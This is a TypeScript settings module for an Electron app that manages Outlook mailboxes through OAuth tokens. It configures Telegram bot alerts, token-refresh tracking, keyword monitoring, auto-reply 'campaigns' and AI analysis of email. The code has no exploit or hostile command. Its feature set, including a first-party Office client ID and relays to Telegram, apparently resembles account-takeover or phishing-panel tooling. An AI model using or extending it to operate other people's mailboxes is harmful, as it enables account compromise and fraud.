import { Settings } from '../../types/store';

const STORE_KEY = 'settings';

const DEFAULT_SETTINGS: Settings = {
  telegram: {
    monitoring: {
      token: '',
      chatId: '',
      enabled: false,
      keywordOnly: false,
    },
    accounts: {
      token: '',
      chatId: '',
      enabled: false,
      notifyTokens: false,
    },
    search: {
      token: '',
      chatId: '',
      enabled: false,
      includeSnippets: false,
    },
    panel: {
      token: '',
      chatId: '',
      backupChatId: '',
      enabled: false,
      notifyAiCritical: true,
      notifySecurityActions: true,
      notifyAutoReplySends: false,
      notifyCampaignProgress: true,
    },
  },
  sync: {
    autoSync: true,
    intervalMinutes: 60,
    autoReconnect: true,
    realTimeWebSocket: true,
  },
  refresh: {
    autoRefresh: true,
    intervalMinutes: 30,
    tagId: 'autorefresh',
  },
  monitoring: {
    enabled: true,
    intervalMinutes: 1,
  },
  storage: {
    encryptionPassword: '',
    localCredentials: true,
  },
  appearance: {
    darkMode: false,
    sidebarCollapsed: false,
  },
  tags: {
    userTags: [],
  },
  dashboard: {
    maxEvents: 10,
    autoRefresh: 60, // 1 minute in seconds
    showTokenRefreshed: true,
    showMonitoringAlerts: true,
    showPanelSynced: true,
    showTokenExpired: true,
    showPanelConnection: true,
    showSearchResults: true,
    showAccountAdded: false,
  },
  ai: {
    analysisMode: 'heuristic',
    openaiApiKey: '',
    openaiModel: 'gpt-4o-mini',
    useFullBodyForAnalysis: false,
  },
  security: {
    filterEnabled: true,
    autoApplyIntervalMinutes: 0,
  },
  autoReply: {
    engineEnabled: false,
    intervalMinutes: 5,
  },
  microsoftOAuth: {
    clientId: 'd3590ed6-52b3-4102-aeff-aad2292ab01c',
    tenantId: 'common',
    redirectUri: 'https://outlook.office.com/mail/',
    scopes: ['Mail.Read', 'Mail.Send', 'offline_access', 'openid', 'profile'],
  },
  outlook: {
    // BCP-47 tag forwarded to OWA via mkt= on every load.
    displayLanguage: 'en-US',
  },
  translation: {
    enabled: true,
    targetLang: 'en',
    // LibreTranslate-compatible. Argos public instance — no API key required.
    endpoint: 'https://translate.argosopentech.com/translate',
    apiKey: '',
  },
  version: '0.1.0',
  platform: '',
  lastUpdated: new Date().toISOString(),
};

function hostPlatformLabel(): string {
  const p = typeof window !== 'undefined' ? (window as any).electron?.platform : '';
  if (p === 'win32') return 'Windows';
  if (p === 'darwin') return 'macOS';
  if (p === 'linux') return 'Linux';
  return p ? String(p) : 'Unknown';
}

export async function getSettings(): Promise<Settings> {
  const settings = await window.electron.store.get(STORE_KEY);
  if (settings && typeof settings === 'object') {
    // Deep merge for telegram (preserve nested defaults)
    const merged = { ...DEFAULT_SETTINGS, ...settings };
    merged.platform = merged.platform && merged.platform !== 'Windows' ? merged.platform : hostPlatformLabel();
    if (settings.telegram && typeof settings.telegram === 'object') {
      merged.telegram = {
        monitoring: { ...DEFAULT_SETTINGS.telegram.monitoring, ...settings.telegram.monitoring },
        accounts: { ...DEFAULT_SETTINGS.telegram.accounts, ...settings.telegram.accounts },
        search: { ...DEFAULT_SETTINGS.telegram.search, ...settings.telegram.search },
        panel: { ...DEFAULT_SETTINGS.telegram.panel, ...settings.telegram.panel },
      };
    }
    if (settings.ai && typeof settings.ai === 'object') {
      merged.ai = { ...DEFAULT_SETTINGS.ai!, ...settings.ai };
    }
    if (settings.security && typeof settings.security === 'object') {
      merged.security = { ...DEFAULT_SETTINGS.security!, ...settings.security };
    }
    if (settings.autoReply && typeof settings.autoReply === 'object') {
      merged.autoReply = { ...DEFAULT_SETTINGS.autoReply!, ...settings.autoReply };
    }
    if (settings.microsoftOAuth && typeof settings.microsoftOAuth === 'object') {
      merged.microsoftOAuth = { ...DEFAULT_SETTINGS.microsoftOAuth!, ...settings.microsoftOAuth };
    }
    if (settings.translation && typeof settings.translation === 'object') {
      merged.translation = { ...DEFAULT_SETTINGS.translation!, ...settings.translation };
    }
    return merged;
  }
  await window.electron.store.set(STORE_KEY, DEFAULT_SETTINGS);
  return DEFAULT_SETTINGS;
}

export async function updateSettings(updates: Partial<Settings>) {
  const current = await getSettings();
  const merged = { ...current, ...updates };
  await window.electron.store.set(STORE_KEY, merged);
  return merged;
}

export async function updateTelegramConfig(bot: keyof Settings['telegram'], config: Settings['telegram'][keyof Settings['telegram']]) {
  const settings = await getSettings();
  const telegram = { ...settings.telegram };
  telegram[bot] = config;
  await updateSettings({ telegram });
}

export async function toggleDarkMode() {
  const settings = await getSettings();
  const newMode = !settings.appearance.darkMode;
  await updateSettings({ appearance: { ...settings.appearance, darkMode: newMode } });
  return newMode;
}

export async function toggleSidebarCollapsed() {
  const settings = await getSettings();
  const newCollapsed = !settings.appearance.sidebarCollapsed;
  await updateSettings({ appearance: { ...settings.appearance, sidebarCollapsed: newCollapsed } });
  return newCollapsed;
}